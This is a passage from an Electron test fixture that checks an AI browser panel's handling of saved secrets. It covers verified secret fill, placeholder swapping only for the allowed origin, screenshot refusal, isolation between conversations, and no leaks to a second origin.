      expect(contents && contents !== parent.webContents, 'the product panel did not create a separate website WebContents');
      const path = pathFor();
      await contents.executeJavaScript(`window.run=async()=>{variables.echoed=await send(${JSON.stringify(allowed.origin + path)},remember());}; true`);
      const observed = await request('observe', { tabId, mode: 'interactive' });
      expect(observed.availableSecrets?.[0]?.secretRef === secret.secretRef, 'the product panel did not offer its saved secret');
      const filled = await request('act', { tabId, observationId: observed.observationId, actions: [{ type: 'fill_secret', ref: control(observed, 'Password'), secretRef: secret.secretRef }] });
      expect(filled.steps?.[0]?.outcome === 'verified', 'the product panel did not verify secret fill');
      placeholders.push(await contents.executeJavaScript("document.getElementById('password').value"));
      const blocked = await request('observe', { tabId, includeImage: true });
      expect(blocked.code === 'credential_on_screen' && !blocked.image, 'the product panel allowed a screenshot after secret fill');
      const beforeClick = await request('observe', { tabId, mode: 'interactive' });
      await request('act', { tabId, observationId: beforeClick.observationId, actions: [{ type: 'click', ref: control(beforeClick, 'Submit') }] });
      expect(allowed.requests.slice(start).some(request => request.path === path && request.body === VALUE), 'the product panel did not swap the allowed outgoing request');
      const state = store.status(SESSION, tabId).at(-1);
      expect(state?.state === 'sent', 'the product panel did not report sent');
      const foreign = await panel.browserTask({ sessionId: 'another-conversation', operation: 'observe', args: { tabId } });
      expect(!foreign.ok, 'the product panel exposed a tab to another conversation');
      clean(returned, [...spellings(VALUE), ...placeholders], 'the product panel returned a secret or placeholder');
      clean(other.requests.slice(startOther), spellings(VALUE), 'the product panel leaked the value to the second origin');
      return { realBrowserPanel: true, separateNativeWebContents: true, allowedRequestSwapped: true, screenshotRefused: true, conversationIsolated: true };
    } finally { panel.destroy(); parent.destroy(); store.clear(); }
  });

  for (const { name, execute } of cases) {
    try { const facts = await execute(); results.push({ name, ok: true, facts }); }
    catch (error) { results.push({ name, ok: false, ...(error instanceof CheckFailed && error.facts ? { facts: error.facts } : {}), error: error instanceof CheckFailed ? error.message : `unexpected ${error instanceof Error ? error.name : "error"}` }); }
    console.log(`${results.at(-1).ok ? "PASS" : "FAIL"} ${name}`);
  }
  console.log(JSON.stringify({ ok: results.every(result => result.ok), electron: process.versions.electron, chrome: process.versions.chrome, results }));
  clearTimeout(timeout);
  for (const window of BrowserWindow.getAllWindows()) window.destroy();
  for (const site of [allowed, other]) { for (const socket of site.sockets) socket.destroy(); site.server.closeAllConnections(); site.server.close(); }
  app.exit(0);
}
run().catch(error => { console.error(`Secret pages fixture failed to run: ${error instanceof Error ? error.name : "error"} ${error instanceof Error ? error.stack?.split("\n").filter(line => line.trim().startsWith("at ")).slice(0, 2).join(" ") : ""}`); app.exit(1); });
